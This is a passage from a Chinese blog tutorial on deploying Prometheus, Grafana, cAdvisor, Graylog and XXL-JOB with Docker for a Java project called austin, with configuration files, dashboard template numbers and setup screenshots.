class="hljs-attribute">monitor</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">prometheus</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">prom/prometheus</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">prometheus</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">prometheus</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./prometheus.yml:/etc/prometheus/prometheus.yml</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9090:9090&quot;</span><br>        <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">monitor</span><br><br>    <span class="hljs-attribute">alertmanager</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">prom/alertmanager</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">alertmanager</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">alertmanager</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9093:9093&quot;</span><br>        <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">monitor</span><br><br>    <span class="hljs-attribute">grafana</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">grafana/grafana</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">grafana</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">grafana</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3000:3000&quot;</span><br>        <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">monitor</span><br><br>    <span class="hljs-attribute">node-exporter</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">quay.io/prometheus/node-exporter</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">node-exporter</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">node-exporter</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9100:9100&quot;</span><br>        <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">monitor</span><br><br>    <span class="hljs-attribute">cadvisor</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">google/cadvisor:latest</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cadvisor</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cadvisor</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">/:/rootfs:ro</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run:/var/run:rw</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">/sys:/sys:ro</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">/var/lib/docker/:/var/lib/docker:ro</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8899:8080&quot;</span><br>        <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">monitor</span><br></code></pre></td></tr></table></figure><p>新建prometheus的配置文件<code>prometheus.yml</code></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">global</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">scrape_interval</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    15s</span><br>  <span class="hljs-attribute">evaluation_interval</span><span class="hljs-punctuation">:</span> <span class="hljs-string">15s</span><br><span class="hljs-attribute">scrape_configs</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">job_name: &#x27;prometheus&#x27;</span><br>    <span class="hljs-attribute">static_configs</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">targets: [&#x27;ip:9090&#x27;]  </span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">job_name: &#x27;cadvisor&#x27;</span><br>    <span class="hljs-attribute">static_configs</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">targets: [&#x27;ip:8899&#x27;]  </span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">job_name: &#x27;node&#x27;</span><br>    <span class="hljs-attribute">static_configs</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">targets: [&#x27;ip:9100&#x27;]  </span><br></code></pre></td></tr></table></figure><p>（<strong>这里要注意端口，按自己配置的来,ip也要填写为自己的</strong>）</p><p>把这份<code>prometheus.yml</code>的配置往<code>/etc/prometheus/prometheus.yml</code> 路径下<strong>复制</strong>一份。随后在目录下<code>docker-compose up -d</code>启动，于是我们就可以分别访问：</p><ul><li>  <code>http://ip:9100/metrics</code>( 查看服务器的指标)</li><li>  <code>http://ip:8899/metrics</code>（查看docker容器的指标）</li><li>  <code>http://ip:9090/</code>(prometheus的原生web-ui)</li><li>  <code>http://ip:3000/</code>(Grafana开源的监控可视化组件页面)</li></ul><p>进到Grafana首页，配置prometheus作为数据源</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/76474c290b594d72b8c26f32e6c93753~tplv-k3u1fbpfcp-zoom-1.image"></p><p>进到配置页面，写下对应的URL，然后保存就好了。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8a78755f4f30431882878ab08e6855bc~tplv-k3u1fbpfcp-zoom-1.image"></p><p>相关监控的模板可以在 <a href="https://grafana.com/grafana/dashboards/">https://grafana.com/grafana/dashboards/</a> 这里查到。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5836357acce442b480628e06b2e7420a~tplv-k3u1fbpfcp-zoom-1.image"></p><p>服务器的监控直接选用<strong>8919</strong>的就好了</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/01a19e6370f54c10b096e1c9bd743b59~tplv-k3u1fbpfcp-zoom-1.image"></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b97faddc55324c2bac2bf13a6e47355e~tplv-k3u1fbpfcp-zoom-1.image"></p><p>import后就能直接看到高大上的监控页面了：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4505d818d2474d8f83d033ad3ad60a64~tplv-k3u1fbpfcp-zoom-1.image"></p><p>使用模板<strong>893</strong>来配置监控docker的信息：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/da69a42ffb984caa99c0beea410dde07~tplv-k3u1fbpfcp-zoom-1.image"></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/14a5c8b4fb5441598ddda816d42d56fd~tplv-k3u1fbpfcp-zoom-1.image"></p><p>选用了<code>4701</code>模板的JVM监控和<code>12900</code>SpringBoot监控（<strong>程序代码已经接入了actuator和prometheus</strong>）。需要在<code>prometheus.yml</code>配置下新增暴露的服务地址：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">&#x27;austin&#x27;</span><br>  <span class="hljs-attr">metrics_path:</span> <span class="hljs-string">&#x27;/actuator/prometheus&#x27;</span> <span class="hljs-comment"># 采集的路径</span><br>  <span class="hljs-attr">static_configs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">&#x27;ip:port&#x27;</span>] <span class="hljs-comment"># todo 这里的ip和端口写自己的应用下的</span><br></code></pre></td></tr></table></figure><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dbd1b8e2b15242a194da0ce8a7c61a80~tplv-k3u1fbpfcp-zoom-1.image"></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/26f4d6d83f4a441d85cb0a396cd0543c~tplv-k3u1fbpfcp-zoom-1.image"></p><h2 id="07、安装GRAYLOG（可选）-分布式日志收集框架"><a href="#07、安装GRAYLOG（可选）-分布式日志收集框架" class="headerlink" title="07、安装GRAYLOG（可选）-分布式日志收集框架"></a>07、安装GRAYLOG（可选）-分布式日志收集框架</h2><p><code>docker-compose.yml</code>文件内容：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">mongo</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mongo:4.2</span><br>      <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">graylog</span><br>    <span class="hljs-attribute">elasticsearch</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">docker.elastic.co/elasticsearch/elasticsearch-oss:7.10.2</span><br>      <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">http.host=0.0.0.0</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">transport.host=localhost</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">network.host=0.0.0.0</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;ES_JAVA_OPTS=-Dlog4j2.formatMsgNoLookups=true -Xms512m -Xmx512m&quot;</span><br>      <span class="hljs-attribute">ulimits</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">memlock</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">soft</span><span class="hljs-punctuation">:</span> <span class="hljs-string">-1</span><br>          <span class="hljs-attribute">hard</span><span class="hljs-punctuation">:</span> <span class="hljs-string">-1</span><br>      <span class="hljs-attribute">deploy</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">resources</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">limits</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1g</span><br>      <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">graylog</span><br>    <span class="hljs-attribute">graylog</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">graylog/graylog:4.2</span><br>      <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">GRAYLOG_PASSWORD_SECRET=somepasswordpepper</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">GRAYLOG_ROOT_PASSWORD_SHA2=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">GRAYLOG_HTTP_EXTERNAL_URI=http://ip:9009/ # 这里注意要改ip</span><br>      <span class="hljs-attribute">entrypoint</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/usr/bin/tini -- wait-for-it elasticsearch:9200 --  /docker-entrypoint.sh</span><br>      <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">graylog</span><br>      <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>      <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">mongo</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">elasticsearch</span><br>      <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">9009:9000</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">1514:1514</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">1514:1514/udp</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">12201:12201</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">12201:12201/udp</span><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">graylog</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br></code></pre></td></tr></table></figure><p>这个文件里唯一需要改动的就是<code>ip</code>（本来的端口是<code>9000</code>的，我由于已经占用了<code>9000</code>端口了，所以我这里把端口改成了<code>9009</code>，你们可以随意）</p><p>启动以后，我们就可以通过<code>ip:port</code>访问对应的Graylog后台地址了，默认的账号和密码是<code>admin/admin</code></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c7d068f7bb7445238688a695eab49c8c~tplv-k3u1fbpfcp-zoom-1.image"></p><p>配置下<code>inputs</code>的配置，找到<code>GELF UDP</code>，然后点击<code>Launch new input</code>，只需要填写<code>Title</code>字段，保存就完事了（其他不用动）。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/88878e8e4bb8428c9c6930cb09d5e249~tplv-k3u1fbpfcp-zoom-1.image"></p><p>最后配置<code>austin.grayLogIp</code>的ip即可实现分布式日志收集</p><h2 id="08、XXL-JOB"><a href="#08、XXL-JOB" class="headerlink" title="08、XXL-JOB"></a>08、XXL-JOB</h2><p>文档：<a href="https://www.xuxueli.com/xxl-job/#2.1%20%E5%88%9D%E5%A7%8B%E5%8C%96%E2%80%9C%E8%B0%83%E5%BA%A6%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%9D">https://www.xuxueli.com/xxl-job/#2.1%20%E5%88%9D%E5%A7%8B%E5%8C%96%E2%80%9C%E8%B0%83%E5%BA%A6%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%9D</a></p><p>xxl-job的部署我这边其实是依赖官网的文档的，步骤可以简单总结为：</p><p><strong>1</strong>、把xxl-job的仓库拉下来</p><p><strong>2</strong>、执行<code>/xxl-job/doc/db/tables_xxl_job.sql</code>的脚本（创建对应的库、创建表以及插入测试数据记录）</p><p><strong>3</strong>、如果是<strong>本地</strong>启动「调度中心」则在<code>xxl-job-admin</code>的<code>application.properties</code>更改相应的数据库配置，改完启动即可</p><p><strong>4</strong>、如果是<strong>云服务</strong>启动「调度中心」，则可以选择拉取<code>docker</code>镜像进行部署，我拉取的是<code>2.30</code>版本，随后执行以下命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull xuxueli/xxl-job-admin:2.3.0<br><br>docker run -e PARAMS=&quot;--spring.datasource.url=jdbc:mysql://ip:3306/xxl_job?useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;useSSL=false&amp;zeroDateTimeBehavior=convertToNull --spring.datasource.username=root --spring.datasource.password=password &quot; -p 6767:8080 --name xxl-job-admin  -d xuxueli/xxl-job-admin:2.3.0<br><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：第二条命令的<strong>ip</strong>和<strong>password</strong>需要更改为自己的，并且，我开的是<strong>6767</strong>端口</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/180eabb4945e475494f3803c69318755~tplv-k3u1fbpfcp-zoom-1.image"></p><h2 id="09、未完待续"><a href="#09、未完待续" class="headerlink" title="09、未完待续"></a>09、未完待续</h2><p>安装更详细的过程以及整个文章系列的更新思路都在公众号<strong>Java3y</strong>连载哟！</p><p>如果你需要用这个项目写在简历上，<strong>强烈建议关注公众号看实现细节的思路</strong>。如果⽂档中有任何的不懂的问题，都可以直接来找我询问，我乐意帮助你们！公众号下有我的联系方式</p><img align="center" src='https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4e109cdb8d064c1e87541d7b6c17957d~tplv-k3u1fbpfcp-zoom-1.image' width=300px height=300px />]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
